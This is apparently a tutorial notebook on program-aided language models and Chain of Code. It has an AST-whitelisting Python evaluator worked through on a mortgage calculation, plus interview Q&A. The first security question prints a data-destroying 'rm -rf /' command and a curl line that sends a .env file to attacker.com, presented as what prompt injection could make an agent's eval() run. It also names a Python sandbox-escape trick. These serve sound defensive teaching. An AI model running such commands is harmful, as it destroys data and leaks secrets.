# Program-Aided Language Models & Dynamic Scratchpad (Chain of Code)

## 1. Theoretical Motivation: The Limits of Autoregressive Token Arithmetic
Autoregressive language models predict the next token via learned statistical probabilities:

$$P(y_t \mid y_{<t}, x)$$

While transformers excel at semantic reasoning and high-level strategy, they are fundamentally **unreliable calculators, algorithmic state machines, and string manipulators**. For multi-step arithmetic ($3429 \times 892$) or iterative loops, errors accumulate exponentially across reasoning steps:

$$P(\text{all steps correct}) = \prod_{t=1}^T P(s_t \mid s_{<t})$$

### Program-Aided Language Models (PAL) & Chain of Code (CoC)
Instead of forcing the neural network to simulate deterministic computation:
1. The LLM writes executable Python code for arithmetic, sorting, filtering, and data manipulation.
2. The code is executed in a secure runtime environment (Scratchpad).
3. The deterministic outputs are piped back into the LLM context to continue reasoning.

This combines the **semantic understanding of neural models** with the **100% precision of symbolic computing engines**!

In [ ]:
import ast
import operator

class SafeMathScratchpad:
    """
    A sandboxed AST evaluator that executes mathematical code safely without eval/exec risks.
    """
    # Supported safe operators
    OPERATORS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.Mod: operator.mod
    }

    def __init__(self):
        self.variables = {}

    def eval_node(self, node):
        if isinstance(node, ast.Constant): # number literal
            return node.value
        elif isinstance(node, ast.Name): # variable reference
            if node.id in self.variables:
                return self.variables[node.id]
            raise ValueError(f"Undefined variable: {node.id}")
        elif isinstance(node, ast.BinOp): # binary operation
            left = self.eval_node(node.left)
            right = self.eval_node(node.right)
            op_type = type(node.op)
            if op_type in self.OPERATORS:
                return self.OPERATORS[op_type](left, right)
            raise NotImplementedError(f"Unsupported operator: {op_type}")
        elif isinstance(node, ast.Assign): # assignment: a = 10
            var_name = node.targets[0].id
            value = self.eval_node(node.value)
            self.variables[var_name] = value
            return value
        raise ValueError(f"Disallowed expression node: {type(node)}")

    def run_scratchpad(self, code_lines):
        execution_trace = []
        for line in code_lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parsed_tree = ast.parse(line, mode='eval' if '=' not in line else 'exec')
            if isinstance(parsed_tree, ast.Expression):
                result = self.eval_node(parsed_tree.body)
            else:
                result = self.eval_node(parsed_tree.body[0])
            execution_trace.append((line, result))
        return execution_trace

# Simulation
scratchpad = SafeMathScratchpad()
program = [
    "principal = 250000",
    "annual_rate = 0.065",
    "years = 30",
    "monthly_rate = annual_rate / 12",
    "total_months = years * 12",
    "factor = (1 + monthly_rate) ** total_months",
    "monthly_payment = principal * (monthly_rate * factor) / (factor - 1)"
]

trace = scratchpad.run_scratchpad(program)
print("Safe Sandboxed AST Scratchpad Execution Trace:")
print("-" * 65)
for code, val in trace:
    print(f"  {code:40s} => {val:.4f}" if isinstance(val, float) else f"  {code:40s} => {val}")

final_payment = scratchpad.variables['monthly_payment']
print("-" * 65)
print(f"Calculated 30-Year Monthly Mortgage Payment: USD {final_payment:.2f}")

## 2. Comparative Benchmark: Chain-of-Thought (CoT) vs PAL / CoC
- **Pure Chain of Thought (CoT)**: Prone to off-by-one errors, arithmetic hallucination, and rounding mistakes on multi-step math problems. Accuracy drops below 50% on 8-step calculations.
- **Chain of Code (CoC)**: Offloads deterministic calculation to Python interpreter while retaining LLM for variable naming and problem modeling. Accuracy exceeds 95% on GSM8K and SVAMP benchmarks.

## 3. High-Yield Interview Questions & Security Best Practices

### Q1: Why is raw `eval()` or `exec()` strictly forbidden in agentic scratchpads?
**Answer:** `eval()` and `exec()` execute arbitrary Python bytecodes. A malicious prompt injection could execute:
```python
__import__('os').system('rm -rf /')
__import__('subprocess').run(['curl', 'attacker.com/leak', '-d', open('.env').read()])
```
Even if builtins are set to `None`, Python's class inheritance hierarchy can be traversed via `().__class__.__base__.__subclasses__()` to recover the `os` module. Safe sandboxing requires strict AST whitelisting, WebAssembly isolation (e.g. Pyodide in WASM), or gVisor/Docker container sandboxing.

### Q2: What is "Chain of Code" (CoC) and how does it handle non-executable pseudocode?
**Answer:** CoC (Li et al., 2023) allows LLMs to write code that mixes executable Python with semantic pseudocode (e.g. `is_sarcastic(sentence)`). If a sub-function cannot be executed programmatically, the CoC runtime catches the exception and prompts the LLM itself to serve as the simulator for that specific line, seamlessly blending symbolic execution and semantic generation.